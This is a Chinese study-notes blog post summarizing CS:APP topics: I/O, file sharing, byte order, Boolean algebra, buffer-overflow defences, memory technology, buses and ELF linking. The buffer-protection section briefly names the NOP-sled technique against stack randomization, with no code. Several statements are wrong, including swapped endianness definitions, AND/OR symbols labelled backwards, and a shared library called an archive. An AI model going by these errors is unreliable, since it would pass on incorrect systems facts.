<p>RIO 提供了两类不同的函数： </p>
<ul>
<li><strong>无缓冲的输入输出函数</strong>：这些函数直接在内存和文件之间传送数据，没有应用级缓冲，它们对将二进制数据读写到网络和从网络读写二进制数据尤其有用</li>
<li><strong>带缓冲的输入函数</strong>：这些函数允许你高效地从文件中读取文本行和二进制数据，这些文件的内容缓存在应用级缓冲区内，类似于为 printf 这样的标准 I/O 函数提供的缓冲区<ul>
<li>与【110】中讲述的带缓冲的 I/O 例程不同，带缓冲的 RIO 输入函数是线程安全的，它在同一个描述符上可以被交错地调用</li>
<li>例如，你可以从一个描述符中读一些文本行，然后读取一些二进制数据，接着再多读取一些文本行</li>
</ul>
</li>
</ul>
<h2 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h2><p>可以用许多不同的方式来共享 Linux 文件，内核用三个相关的数据结构来表示打开的文件： </p>
<ul>
<li><strong>描述符表</strong>（descriptor table）：每个进程都有它独立的描述符表，它的表项是由进程打开的文件描述符来索引的。每个打开的描述符表项指向文件表中的一个表项</li>
<li><strong>文件表</strong>（file table）：打开文件的集合是由一张文件表来表示的，所有的进程共享这张表，每个文件表的表项组成：<ul>
<li>包括当前的 <strong>文件位置</strong> 、<strong>引用计数</strong>（reference count）（即当前指向该表项的描述符表项数），以及一个 <strong>指向 v-node 表</strong> 中对应表项的指针</li>
<li>关闭一个描述符会减少相应的文件表表项中的引用计数</li>
<li>内核不会删除这个文件表表项，直到它的引用计数为零</li>
</ul>
</li>
<li><strong>v-node 表</strong>（v-node table）：同文件表一样，所有的进程共享这张 v-node 表，每个表项包含 stat 结构中的大多数信息，包括 st_mode 和 st_size 成员</li>
</ul>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>系统并不是由 <strong>孤立的</strong> 硬件和软件组成的结合体，而是可以通过 <strong>网络</strong> 相互通信</p>
<p>对于一个单独的系统而言，网络可以认为是一个<strong>I/O设备</strong>（输入或输出数据到本机）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639411220256-1640976664503-1646286364492-1646808754596-1646808862602.png" class width="1639411220256"> 
<h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><p>计算机的发展始终围绕两个目的：1.更多    2.更快</p>
<p><strong>并发</strong>：指一个同时具有多活动的系统</p>
<p><strong>并行</strong>：指使用 <strong>并发</strong> 来使一个系统运行得更快</p>
<p>并行可以在计算机系统的多个 <strong>抽象层次</strong> 中运用，其中最主要的有3个：</p>
<p><strong>1.线程级并发</strong></p>
<p>构建在进程这个抽象之上，我们可以设计出有多个 <strong>“程序执行工具”</strong> 的系统，这导致了 <strong>并行</strong></p>
<p>这个“程序执行工具”就是线程，使用线程，我们甚至可以在一个进程中执行多个 <strong>控制流</strong></p>
<p><strong>2.指令级并行</strong></p>
<p>构建在较低的抽象层次上，使处理器可以<strong>同时执行</strong>多条指令</p>
<p><strong>3.单指令，多数据并行</strong></p>
<p>构建在较最的抽象层次上，允许一条指令可以产生多个<strong>“并行执行”</strong>的操作</p>
<p>​        //即<strong>SIMD</strong>并行</p>
<h2 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h2><p>指令集架构（InstructionSetArchitecture）</p>
<p>描述：指的是CPU机器码所使用的指令的集合以及其背后的寄存器体系、总线设计等逻辑框架 ，也是规定的一系列CPU与其他硬件电路相配合的指令系统 </p>
<p>作用：定义 <strong>机器级程序</strong> 的格式和行为，它定义了 <strong>处理器状态</strong> ， <strong>指令的格式</strong> ，以及 <strong>每条指令的影响</strong></p>
<p>行为：每条指令<strong>顺序执行</strong>，一条指令完成后，另一条指令开始</p>
<p>​        //不同进程中的指令会被CPU<strong>并发</strong>处理，但是就一个进程而言，它的指令是<strong>“顺序执行”</strong>的</p>
<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>大端序：符合人类的认知（低地址存低位，高地址存高位）</p>
<p>小端序：利用机器的运算（低地址存高位，高地址存低位）</p>
<p>为了方便阅读程序，我们通常把低地址写在上面，把高地址写在下面</p>
<p>​        // 这样小端序就“符合人类的认知”</p>
<p>不同的系统采用不同的<strong>字节序</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_show_bytes</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ival = val;</span><br><span class="line">    <span class="keyword">float</span> fval = (<span class="keyword">float</span>) ival;</span><br><span class="line">    <span class="keyword">int</span> *pval = &amp;ival;</span><br><span class="line">    show_int(ival);</span><br><span class="line">    show_fload(fval);</span><br><span class="line">    show_pointer(pval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639568507336-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639568507336"> 
<h2 id="布尔代数"><a href="#布尔代数" class="headerlink" title="布尔代数"></a>布尔代数</h2><p>将逻辑值True和False用二进制值“1”和“0”表示，设计出了一种代数</p>
<p>基础逻辑运算：“ ~ ”（非），“ &amp; ”（或），“ | ”（与），“ ^ ”（异或）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639569041012-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639569041012"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639569059817-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639569059817"> 
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>过程是软件中一种很重要的抽象，它提供了一种 <strong>封装</strong> 代码的方式，用一组 <strong>指定的参数</strong> 和一个 <strong>可选择的返回值</strong> 实现了某种功能，而程序可以在任何一个位置引用这种功能</p>
<p>设计良好的软件用 <strong>过程</strong> 作为抽象机制，隐藏某个行为的具体表现，同时又提供清晰简洁的 <strong>接口定义</strong> ，说明需要计算的是哪些值，过程会对程序状态产生什么影响</p>
<p>过程在不同的<strong>编译语言</strong>中有不同的名称：函数（Function），方法（method），子例程，处理函数</p>
<h2 id="嵌套数组-amp-变长数组"><a href="#嵌套数组-amp-变长数组" class="headerlink" title="嵌套数组&amp;变长数组"></a>嵌套数组&amp;变长数组</h2><p>嵌套数组：（多维数组）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> A[<span class="number">5</span>][<span class="number">3</span>]</span><br><span class="line">------------------------</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> row3_[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">row3_t</span> A[<span class="number">5</span>];</span><br></pre></td></tr></table></figure>
<p>两者是等价的</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640064445176-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640064445176"> 
<p>变长数组：</p>
<p>变长数组既数组大小待定的数组， C语言中结构体的最后一个元素可以是大小未知的数组，也就是所谓的0长度，所以我们可以用结构体来创建变长数组 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[];</span><br><span class="line">&#125;SoftArray;</span><br></pre></td></tr></table></figure>
<h2 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h2><p>c语言提供了两种不同类型的对象组合到一起创建数据类型的机制：</p>
<p>1.结构（structure）    2.联合（union）</p>
<p>structure可以将多个对象集合到一个单位中</p>
<p>union可以用几种不同的类型来引用一个对象</p>
<h2 id="缓存区保护"><a href="#缓存区保护" class="headerlink" title="缓存区保护"></a>缓存区保护</h2><p>1.栈随机化</p>
<p>使栈在每一次加载时都会发生变化</p>
<p>对抗：空操作雪橇，在shellcode前面插入相等长度的“nop”，只要有一个地址命中“nop”就行</p>
<p>​        //汇编指令“nop”让IP指针+1，没有其他作用</p>
<p>2.栈破坏机制</p>
<p>Canary（金丝雀）是系统生成的一个随机数，如果它被破坏，系统就会强行终止程序</p>
<p>3.限制可执行权限</p>
<h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><p>以“ . ”开头的指令就是 <strong>伪指令</strong> ，它们告诉汇编器<strong>调整地址</strong>，以便在那里产生代码或插入一些数据</p>
<p>例如：伪指令“.pos 0”告诉汇编器应该从地址“0”开始产生代码</p>
<h2 id="控制语言-HCL"><a href="#控制语言-HCL" class="headerlink" title="控制语言(HCL)"></a>控制语言(HCL)</h2><p>大多数现代的电路技术都是用<strong>信号线上的高低电压</strong>来表示不同的值</p>
<p>​        //逻辑1用1.0伏特的高电压，逻辑0用0.0伏特的低电压</p>
<p>为了方便编程，<strong>硬件描述语言HDL</strong>（Hardware Description Language）诞生了</p>
<p>HDL是一种文本表示，和编程语言类似，但是它是用来描述 <strong>硬件结构</strong> 而不是 <strong>程序行为</strong> 的</p>
<p>HCL语言只表达硬件设计的<strong>控制逻辑</strong>部分，只有有限的操作集合（控制逻辑是处理器中最困难的）</p>
<h2 id="逻辑门"><a href="#逻辑门" class="headerlink" title="逻辑门"></a>逻辑门</h2><p>逻辑门是数字电路的基本计算单元，它们的产生和输出，等于它们输入位数的某个布尔函数</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640840566258-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640840566258"> 
<h2 id="组合电路"><a href="#组合电路" class="headerlink" title="组合电路"></a>组合电路</h2><p>将很多的逻辑门组合成一个网，就可以构建出一个<strong>计算块</strong>（computational block），称为组合电路</p>
<h2 id="优化编译器的能力"><a href="#优化编译器的能力" class="headerlink" title="优化编译器的能力"></a>优化编译器的能力</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640841353636-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640841353636"> 
<p>这两个函数有相同的功能，但CPU读写效率却有不同：</p>
<p>第一个函数需要：2次读 <em>xp，2次读 </em>yp，2次写 *xp</p>
<p>第二个函数需要：1次读 <em>xp，1次读 </em>yp，1次写 *xp</p>
<h2 id="程序性能的表示"><a href="#程序性能的表示" class="headerlink" title="程序性能的表示"></a>程序性能的表示</h2><p>我们引入度量标准：<strong>每元素的周期数</strong>（Cycles Per Element），作为一种表示程序性能并指引我们改进代码的方法</p>
<p>处理器活动的顺序是由时钟控制的，时钟提供了某个频率的规律信号，通常用<strong>千兆赫兹</strong>，十亿周期每秒来表示</p>
<p>例如：一个系统有“4GHz”处理器，表示这个系统的处理器时钟运行频率为<strong>4 * 10的9次方 /每秒</strong></p>
<h2 id="存储器系统"><a href="#存储器系统" class="headerlink" title="存储器系统"></a>存储器系统</h2><p>存储器系统是一个具有不同<strong>容量，成本，访问时间</strong>的存储设备层次结构</p>
<p>靠近CPU的，小的，快速的，称为<strong>高速缓存存储器</strong></p>
<p>这个思想围绕着计算机程序的一种称为 <strong>局部性</strong> 的基本属性，具有良好局部性的程序倾向于一次又一次地访问相同的 <strong>数据项集合</strong> ，或是倾向访问邻近的 <strong>数据项集合</strong> ，并且更多的倾向于从存储器层次结构中较高层次处访问 <strong>数据项集合</strong> ，这些操作都可以使程序运行得更快</p>
<h2 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h2><p><strong>简述</strong></p>
<p>原指处理器在访问某些数据时短时间内存在重复访问，某些数据或者位置访问的 <strong>概率极大</strong> ，大多数时间只访问局部的数据（随着优化技术的提升，局部性的概念也得到了扩充）</p>
<p>其实就是概率的不均等，这个宇宙中，很多东西都不是平均分布的，平均分布是概率论中几何分布的一种特殊形式，非常简单，但世界就是没这么简单。我们更长听到的发布叫做高斯发布，同时也被称为正态分布，因为它就是正常状态下的概率发布，起概率图如下 ：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640843878222-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640843878222"> 
<p><strong>时间局部性(Temporal locality):</strong> </p>
<p>如果某个信息这次被访问，那它有可能在不久的未来被多次访问</p>
<p>时间局部性是空间局部性访问地址一样时的一种特殊情况，这种情况下，可以把常用的数据加<strong>cache</strong>（缓存）来优化访存</p>
<p><strong>空间局部性(Spatial locality):</strong> </p>
<p>如果某个位置的信息被访问，那和它相邻的信息也很有可能被访问到</p>
<p>这个也很好理解，我们大部分情况下代码都是顺序执行，数据也是顺序访问的 </p>
<p><strong>内存局部性(Memory locality):</strong> </p>
<p>访问内存时，大概率会访问连续的块，而不是单一的内存地址，其实就是 <strong>空间局部性在内存上</strong> 的体现</p>
<p>目前计算机设计中，都是以块/页为单位管理调度存储，其实就是在利用空间局部性来优化性能 </p>
<p><strong>分支局部性(Branch locality)</strong> </p>
<p>这个又被称为顺序局部性，计算机中大部分指令是顺序执行，即便有if这种选择分支，其实大多数情况下某个分支都是被大概率选中的</p>
<p>于是就有了CPU的分支预测优化，设计CPU优先选择 <strong>概率较大 </strong>的if分支</p>
<p><strong>等距局部性(Equidistant locality)</strong> </p>
<p>等距局部性是指如果某个位置被访问，那和它 <strong>相邻等距离的连续地址</strong> 极有可能会被访问到，它位于空间局部性和分支局部性之间</p>
<p>举个例子，比如多个相同格式的数据数组，你只取其中每个数据的一部分字段，那么他们可能在内存中地址距离是等距的，这个可以通过简单的线性预测就预测是未来访问的位置</p>
<p><strong>步长对局部性的影响</strong></p>
<p>步长：连续序列号的差值</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115117925-1646286364493-1646808754596-1646808862602.png" class width="1641115117925"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115127425-1646286364493-1646808754596-1646808862602.png" class width="1641115127425"> 
<p>两个函数只是交互了循环的次序，但程序的性能却截然不同</p>
<p>第一个程序：步长为“4”（int类型） [ 4 - 0 ]</p>
<p>第二个程序：步长为“12”（int类型 * 3）[ 12 - 0 ]</p>
<p>第一个程序的性能远高于第二个程序（步长越长，性能越差）</p>
<h2 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h2><p><strong>静态RAM</strong>（SRAM）</p>
<p>SRAM将每个<strong>位</strong>存储在一个 <strong>双稳态</strong> 的存储器单元中（每个单元通常是用一个 <strong>6晶体管电路</strong> 来实现的）</p>
<p>这个电路有这样一个属性：它可以无限期地保持 “两个不同的电压配置” 中的一个</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640849464616-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640849464616"> 
<p>这个<strong>双稳态</strong>的存储器单元就像图中的钟摆一样，除了左右稳态以外的任何区域都是不稳定的</p>
<p>只要有电，它就会永远保持它的值，即使有外界干扰也会马上回复</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013069193-1646286364493-1646808754596-1646808862602.png" class width="1641013069193"> 
<p><strong>动态RAM</strong>（DRAM）</p>
<p>DRAM将每个<strong>位</strong>存储为一个 <strong>电容的充电</strong>（每个单元由一个 <strong>电容</strong> 和一个 <strong>访问晶体管</strong> 组成）</p>
<p>和SRAM有着较强的稳定性不同，DRAM对干扰非常敏感，电容电压被扰乱以后就不会恢复了</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640850052720-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640850052720"> 
<p>DRAM芯片被封装在内存模块中</p>
<p>内存模块 (Memory Module)是指一个 <strong>印刷电路板</strong> 表面上有镶嵌数个 <strong>记忆体</strong> ， <strong>芯片chips</strong>(碎片)，而这 内存芯片 通常是 DRAM芯片</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013117768-1646286364493-1646808754596-1646808862602.png" class width="1641013117768"> 
<p><strong>增强型DRAM</strong></p>
<p>快页模式DRAM（FPM DRAM）</p>
<p>扩展数据DRAM（EDO DRAM）</p>
<p>同步DRAM（SDRAM）</p>
<p>双倍数据速率同步DRAM（DDR SDRAM）</p>
<p>视频RAM（VRAM）</p>
<p><strong>只读存储器ROM</strong>（ROM是一种非易失性存储器）</p>
<p>如果计算机突然断电，DRAM和SRAM都会失去它们的数据，所以它们是<strong>易失的</strong></p>
<p>在失去电源的情况下，数据也不会丢失的存储器就是<strong>非易失性存储器</strong></p>
<p>最开始的ROM是真的“只读”的，但是随着技术的发展，ROM也慢慢“可读”了起来</p>
<p><strong>可编程ROM</strong>（PROM）</p>
<p>PROM只能每编程一次（PROM的每个存储器单元都有一种熔丝（fuse），只能被高温熔断一次）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641013659516-1646286364493-1646808754596-1646808862602.png" class width="1641013659516"> 
<p><strong>可擦写可编程ROM</strong>（EPROM）</p>
<p>EPROM有一个透明的石英窗口，允许光线到达存储单元，当紫外线射过窗口时，EPROM单元会被清除为“0”，对EPROM的编程需要通过特殊设备（把“1”写入EPROM），EPROM总共可以擦除重编程的次数为：10的3次方</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640852450140-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640852450140"> 
<p><strong>电子可擦除PROM</strong>（EEPROM）</p>
<p>EEPROM和EPROM类似，只不过不用特殊设备就可以对它进行编程，可以直接在印制电路卡上进行编程，EEPROM总共可以被编程的次数为：10的5次方</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640852477583-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640852477583"> 
<p><strong>闪存</strong>（flash memory）</p>
<p>闪存基于EEPROM，是一种重要的存储技术（U盘就是利用Flash实现的）</p>
<p>与前面的PROM，EPROM，EEPROM以 <strong>位</strong> 为单位不同，Flash以 <strong>块</strong> 为单位（128kb，256kb）</p>
<p>Flash的基本构成单位为<strong>浮栅场效应管</strong>（这是一个三端器件，分别为：源极，漏极，栅极）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640853366687-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640853366687"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640853224793-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640853224793"> 
<p><strong>磁盘</strong></p>
<p>磁盘是用于大量存储数据的存储设备，存储数据的数量级可以达到几千千兆字节，但从磁盘上读取数据的时间为毫秒级，比DRAM慢了10万倍，比SRAM慢了100万倍</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641014928544-1646286364493-1646808754596-1646808862602.png" class width="1641014928544"> 
<p>磁盘由多个重叠在一起的盘片组成，它们被封装在一个密封的包装中</p>
<h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>在内存调试时，经常需要用到rank、bank等参数，可以看到电脑的内存条中，有很多一片一片的芯片，这就是内存芯片，也是叫内存颗粒 </p>
<p>内存的基本单元称为 <strong>cell</strong> ，cell按行( <strong>row</strong> )、列( <strong>column</strong> )分布组成一个 <strong>bank</strong> </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641012026126-1646286364493-1646808754596-1646808862602.png" class width="1641012026126"> 
<p>一颗内存颗粒由多个 <strong>bank</strong> 组成，现在的内存颗粒一般是8个bank，每个bank对于内存来说是平等的关系，因为内存控制器的原因，每个时钟周期只能对一个bank进行操作 </p>
<p>所有在内存容量关系中：<strong>颗粒</strong> &gt; <strong>bank</strong> &gt; <strong>row</strong> ， <strong>column</strong> &gt; <strong>cell</strong> </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641012787423-1646286364493-1646808754596-1646808862602.png" class width="1641012787423"> 
<h2 id="IO桥接器"><a href="#IO桥接器" class="headerlink" title="IO桥接器"></a>IO桥接器</h2><p>数据通过总线进行流通，每次CPU和主存之间的数据传输都是通过一系列步骤完成的，这些步骤被称为<strong>总线事务</strong></p>
<p>读事务：把数据从主存传输到CPU</p>
<p>写事务：把数据从CPU传输到主存</p>
<p>而现代计算机中IO是通过 <strong>共享一条总线</strong> 的方式来实现的，这就是 <strong>IO总线</strong>（I/O bus）</p>
<p>而<strong>IO桥接器</strong>则是一组芯片组（其中包括内存控制器）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641009467416-1646286364493-1646808754596-1646808862602.png" class width="1641009467416"> 
<p>CPU芯片，IO桥接器，DRAM内存模块</p>
<p>系统总线（system bus）连接了CPU和IO桥接器</p>
<p>内存总线（memory bus）连接IO桥接器和主存</p>
<p>系统总线和内存总线都通过IO桥接器连接到IO总线上，这就实现了各个硬件之间的交互</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641010785822-1646286364493-1646808754596-1646808862602.png" class width="1641010785822"> 
<p>在这个过程中：CPU上被称为<strong>总线接口</strong>的电路会在总线上发起“读事务”</p>
<p>​        //交换“A”和“%rax”位置，则会发起“写事务”</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011441241-1646286364493-1646808754596-1646808862602.png" class width="1641011441241"> 
<p>CPU会把A放到系统总线上，IO桥接器将信号传递到内存总线,传输到主存</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011450090-1646286364493-1646808754596-1646808862602.png" class width="1641011450090"> 
<p>接下来主存会识别内存总线上的地址信号，从内存总线中读取地址，从DRAM中取出数据字，并将数据写入内存总线通过IO桥又写入系统总线，传输到CPU</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011460116-1646286364493-1646808754596-1646808862602.png" class width="1641011460116"> 
<p>最后CPU会读取系统总线上的数据，赋值给寄存器rax</p>
<h2 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h2><p>链接（linking）是将 <strong>各种代码</strong> 和 <strong>数据片段</strong> 收集并组合成一个单一文件的过程</p>
<p>负责链接工作的程序被称为“链接器”</p>
<p>链接器的出现使我们不用将一个应用组织为一个庞大的文件，而是可以分割为更小的模块</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641352337650-1646286364493-1646808754596-1646808862602.png" class width="1641352337650"> 
<h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态链接的链接器必须完成两个任务：符号解析，重定位</p>
<p>符号解析：解析目标文件的符号，把 <strong>符号引用</strong> 和 <strong>符号定义</strong> 关联起来</p>
<p>重定位：通过把 <strong>符号定义</strong> 和 <strong>内存位置</strong> 关联起来，来重定位这些节片段，然后修改对这些符号的引用，使它们指向对应的内存位置</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>在创建可执行文件时，静态执行一些链接</p>
<p>在程序加载时，动态完成链接</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641720884346-1646286364493-1646808754596-1646808862602.png" class width="1641720884346"> 
<p>动态链接器通过执行下面的重定位来完成链接任务：</p>
<ul>
<li>重定位 libc.so 的文本和数据到某个内存段</li>
<li>重定位 libvector.so 的文本和数据到另一个内存段</li>
<li>重定位 prog21 中所有的 “由 libc.so 和 libvector.so(存档文件) 定义的” 符号的引用</li>
</ul>
<h2 id="存档文件"><a href="#存档文件" class="headerlink" title="存档文件"></a>存档文件</h2><p>存档文件（libvector.so）是一种文件格式，用于存储一组文件以及与这些文件有关的信息（元数据），创建存档文件的目的是将多个文件存储在一起，通常采用压缩格式，这样可以提高可移植性，同时节省磁盘上的存储空间</p>
<h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>目标文件分为3种：</p>
<p>1.可重定位目标文件：包含二进制代码和数据，可以在编译时与其他可重定位目标文件合并，创建一个可执行目标文件</p>
<p>2.可执行目标文件：包含二进制代码和数据，可以直接放入内存执行（就是可执行文件）</p>
<p>3.共享目标文件：一种特殊的可重定位目标文件，可以在加载或者运行时被 <strong>动态</strong> 地加载进内存并进行连接</p>
<p>编译器和汇编器生成：可重定位目标文件</p>
<p>链接器生成：可执行目标文件</p>
<p>各个系统目标文件的格式不同：Unix系统，采用a.out格式；Windows系统，采用PE格式；MacOS系统，采用Mach-O格式</p>
<h2 id="可重定位目标文件"><a href="#可重定位目标文件" class="headerlink" title="可重定位目标文件"></a>可重定位目标文件</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641279880688-1646286364493-1646808754596-1646808862602.png" class width="1641279880688"> 
<p>这个就是可重定位目标文件的格式，ELF头描述了产生该文件的系统的 <strong>字的大小</strong> 和 <strong>字节序</strong></p>
<p>ELF头剩下的部分包含：帮助链接器进行 <strong>语法分析</strong> 和 <strong>解释目标文件</strong> 的信息</p>
<p>不同节的位置大小是由 “节头部” 决定的，其中目标文件的每个节都有一个固定大小的条目（entry），夹在“ELF头”和“节头部表”之间的都是节</p>
<p>一个经典的ELF可重定位目标文件包含下面几个节：</p>
<p>.text：已经编译的程序机器代码</p>
<p>.rodata：只读数据</p>
<p>.data：已经初始化的 全局变量 和 静态变量（局部变量保存在栈中）</p>
<p>.bss：未初始化的 全局变量 和 静态变量（被初始化为“0”的变量也会保存在这里）</p>
<p>.symtab：符号表，用于存放程序中定义或引用的 “函数和全局变量” 的信息</p>
<p>.rel.text：“.text节”的重定位信息，用于重新修改代码段的指令中的地址信息 </p>
<p>.debug：调试符号表</p>
<p>.line：原始C源程序中的行号 和 “.text节”中机器指令之间的映射</p>
<p>.strtab：字符串表（包含“.symtab”和“.debug”中的符号名和节名）</p>
<h2 id="符号及其相关"><a href="#符号及其相关" class="headerlink" title="符号及其相关"></a>符号及其相关</h2><p><strong>符号（symbol）</strong></p>
<p>函数名，变量名，数组名，结构体名都可以称之为符号</p>
<p>在链接器的上下文中一共有3中不同的符号：</p>
<ul>
<li>Global symbols（模块内部定义的全局符号）<ul>
<li>由模块m定义并能被其他模块引用的符号（非static函数，非static全局变量）</li>
</ul>
</li>
<li>External symbols（外部定义的全局符号）<ul>
<li>由其他模块定义并被模块m引用的全局符号</li>
</ul>
</li>
<li>Local symbols（本模块的局部符号）<ul>
<li>仅由模块m定义和引用的本地符号（带有static的函数和全局变量）</li>
<li>注意：局部变量不会在过程外被引用（分配在栈中），因此不是符号定义</li>
</ul>
</li>
</ul>
<p><strong>符号表（symtab）</strong></p>
<p>符号表是由汇编器构造的，包含一个条目的数组，每个条目都是一个结构体</p>
